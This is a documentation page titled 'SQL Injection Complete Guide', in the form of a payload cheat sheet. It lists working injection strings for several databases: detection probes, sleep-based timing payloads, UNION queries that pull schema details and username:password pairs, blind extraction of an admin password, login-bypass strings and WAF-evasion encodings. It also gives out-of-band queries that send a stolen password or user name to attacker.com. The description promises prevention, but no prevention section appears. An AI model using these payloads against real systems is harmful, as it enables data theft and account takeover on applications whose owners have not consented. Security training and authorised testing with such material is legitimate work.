---
title: SQL Injection Complete Guide
description: A comprehensive guide to understanding, detecting, exploiting, and preventing SQL injection vulnerabilities
---

import { Card, CardGrid, LinkCard, Tabs, TabItem, Icon, Steps } from '@astrojs/starlight/components';

<CardGrid stagger>
  <Card title="What is SQL Injection?" icon="open-book">
    A security vulnerability that occurs when an attacker can insert malicious SQL code into queries that an application makes to its database.
  </Card>
  
  <Card title="Potential Impact" icon="warning">
    - Unauthorized data access
    - Data manipulation/deletion
    - Authentication bypass
    - Server compromise
    - Denial of service
  </Card>
  
  <Card title="Risk Level" icon="error">
    SQL injection is considered a critical vulnerability (CVSS Score: 7.0-10.0) that can lead to complete system compromise.
  </Card>
</CardGrid>

## Detection Techniques

### Initial Testing

<Steps>
1. **Basic Character Tests**
   ```sql
   [Nothing]
   '
   "
   `
   ')
   ")
   `)
   '))
   "))
   `))
   ```

2. **Database-Specific Comments**
   <Tabs>
     <TabItem label="MySQL">
       ```sql
       #comment
       -- comment     [Space required after --]
       /*comment*/
       /*! MYSQL Special SQL */
       ```
     </TabItem>
     <TabItem label="PostgreSQL">
       ```sql
       --comment
       /*comment*/
       ```
     </TabItem>
     <TabItem label="MSSQL">
       ```sql
       --comment
       /*comment*/
       ```
     </TabItem>
     <TabItem label="Oracle">
       ```sql
       --comment
       ```
     </TabItem>
     <TabItem label="SQLite">
       ```sql
       --comment
       /*comment*/
       ```
     </TabItem>
   </Tabs>

3. **Logical Operations Testing**
   ```sql
   page.asp?id=1 or 1=1    # True condition
   page.asp?id=1' or 1=1   # True with string termination
   page.asp?id=1" or 1=1   # True with double quote
   page.asp?id=1 and 1=2   # False condition
   ```
</Steps>

## Time-Based Detection

<Tabs>
  <TabItem label="MySQL">
    ```sql
    1' + sleep(10)
    1' and sleep(10)
    1' && sleep(10)
    1' | sleep(10)
    ```
  </TabItem>
  <TabItem label="PostgreSQL">
    ```sql
    1' || pg_sleep(10)
    ```
  </TabItem>
  <TabItem label="MSSQL">
    ```sql
    1' WAITFOR DELAY '0:0:10'
    ```
  </TabItem>
  <TabItem label="Oracle">
    ```sql
    1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
    ```
  </TabItem>
  <TabItem label="SQLite">
    ```sql
    1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
    ```
  </TabItem>
</Tabs>

## Exploitation Techniques

### UNION Based Attacks

<Steps>
1. **Column Count Detection**
   ```sql
   # Using ORDER BY
   1' ORDER BY 1--+
   1' ORDER BY 2--+
   1' ORDER BY 3--+
   
   # Using UNION SELECT
   1' UNION SELECT null--
   1' UNION SELECT null,null--
   1' UNION SELECT null,null,null--
   ```

2. **Data Extraction**
   ```sql
   # Database names
   -1' UNION SELECT 1,2,GROUP_CONCAT(schema_name) 
   FROM information_schema.schemata--
   
   # Table names
   -1' UNION SELECT 1,2,GROUP_CONCAT(table_name) 
   FROM information_schema.tables 
   WHERE table_schema='target_db'--
   
   # Column names
   -1' UNION SELECT 1,2,GROUP_CONCAT(column_name) 
   FROM information_schema.columns 
   WHERE table_name='target_table'--
   ```

3. **Data Retrieval**
   ```sql
   -1' UNION SELECT 1,2,GROUP_CONCAT(username,':',password) 
   FROM users--
   ```
</Steps>

### Blind SQL Injection

<CardGrid>
  <Card title="Boolean Based" icon="random">
    ```sql
    # Test each character
    1 AND SUBSTRING((SELECT password FROM users 
    WHERE username = 'admin'),1,1) = 'a'
    ```
  </Card>
  <br/>
  <Card title="Time Based" icon="seti:lua">
    ```sql
    1 AND IF(SUBSTRING((SELECT password FROM users 
    WHERE username = 'admin'),1,1) = 'a', 
    SLEEP(5), 0)
    ```
  </Card>
</CardGrid>

### Authentication Bypass Techniques

<Tabs>
  <TabItem label="Basic Bypasses">
    ```sql
    admin' --
    admin' #
    admin'/*
    admin' or '1'='1
    admin' or '1'='1'--
    ```
  </TabItem>
  <TabItem label="Advanced Bypasses">
    ```sql
    admin') or ('1'='1
    admin') or ('1'='1'--
    admin'or 1=1 or ''='
    admin' or 1=1
    admin' or 1=1--
    admin' or 1=1#
    admin' or 1=1/*
    ```
  </TabItem>
</Tabs>

## WAF Bypass Techniques

### Space Character Bypasses

<CardGrid>
  <Card title="Using Encoded Characters" icon="pencil">
    ```sql
    id=1%09and%091=1%09--
    id=1%0Dand%0D1=1%0D--
    id=1%0Cand%0C1=1%0C--
    id=1%0Band%0B1=1%0B--
    id=1%0Aand%0A1=1%0A--
    ```
  </Card>
  
  <Card title="Using Comments" icon="document">
    ```sql
    id=1/**/and/**/1=1/**/--
    id=(1)and(1)=(1)--
    ```
  </Card>
</CardGrid>

### SQL Keyword Bypasses

<Tabs>
  <TabItem label="Operator Alternatives">
    ```sql
    AND   -> && -> %26%26
    OR    -> || -> %7C%7C
    =     -> LIKE, REGEXP, RLIKE
    > X   -> NOT BETWEEN 0 AND X
    ```
  </TabItem>
  <TabItem label="Comment Alternatives">
    ```sql
    -- comment
    # comment
    /*comment*/
    ;%00
    ```
  </TabItem>
</Tabs>

## Out of Band (OOB) Techniques

<Card title="DNS Exfiltration" icon="external">
  ```sql
  # MySQL
  SELECT LOAD_FILE(CONCAT('\\\\',
    (SELECT password FROM users WHERE id=1),
    '.attacker.com\\1.txt'));
  
  # Oracle
  SELECT UTL_HTTP.REQUEST
    ('http://attacker.com/'||(SELECT user FROM DUAL))
    FROM DUAL;
  ```
</Card>

## Additional Resources

<CardGrid>
  <LinkCard
    title="OWASP SQL Injection Guide"
    description="Comprehensive guide from OWASP about SQL injection"
    href="https://owasp.org/www-community/attacks/SQL_Injection"
    icon="external"
  />
  
  <LinkCard
    title="PortSwigger Web Security Academy"
    description="Interactive SQL injection learning materials"
    href="https://portswigger.net/web-security/sql-injection/cheat-sheet"
    icon="external"
  />
</CardGrid>
